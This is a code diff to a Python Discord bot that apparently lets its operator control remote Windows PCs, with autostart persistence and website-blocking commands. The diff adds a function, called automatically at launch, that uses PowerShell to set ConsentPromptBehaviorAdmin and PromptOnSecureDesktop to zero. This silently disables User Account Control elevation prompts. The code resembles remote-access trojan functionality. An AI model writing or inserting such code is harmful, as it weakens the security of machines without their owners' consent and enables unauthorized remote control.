@@ -133,7 +133,26 @@ def setup_autostart():
     except Exception as e:
         print(f"[AUTOSTART ERROR] {e}")
 
-# Füge dies direkt nach der Bot-Initialisierung hinzu:
+def set_lowest_uac_level():
+    try:
+        command = """
+        $key = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+        Set-ItemProperty -Path $key -Name "ConsentPromptBehaviorAdmin" -Value 0
+        Set-ItemProperty -Path $key -Name "PromptOnSecureDesktop" -Value 0
+        Set-ItemProperty -Path $key -Name "EnableLUA" -Value 1
+        """
+        
+        subprocess.run(
+            ["powershell", "-Command", command],
+            check=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        return True
+    except subprocess.CalledProcessError as e:
+        return False
+
+
 bot = MyBot(
     command_prefix="!",
     intents=discord.Intents.all(),
@@ -1328,4 +1347,5 @@ async def unblock_website(ctx, pc_name: str, url: str):
         await ctx.send(f"❌ Error: {str(e)}")
 
 setup_autostart()
+set_lowest_uac_level()
 bot.run(TOKEN)
